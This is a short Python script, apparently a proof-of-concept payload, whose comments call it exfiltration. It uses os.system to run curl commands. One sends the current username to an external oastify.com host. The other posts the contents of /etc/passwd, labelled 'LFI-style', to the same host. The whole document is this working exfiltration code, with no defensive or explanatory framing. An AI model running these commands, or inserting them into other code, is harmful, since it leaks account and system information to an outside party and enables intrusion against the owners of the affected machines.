
import os
# Exfiltrate current user
os.system("curl http://j6q0lq8adgwtkcg9rvzjze19107zvpje.oastify.com/$(whoami)")

# Read and exfiltrate /etc/passwd (LFI-style)
os.system("curl -X POST --data-binary '@/etc/passwd' http://j6q0lq8adgwtkcg9rvzjze19107zvpje.oastify.com/$(whoami)")
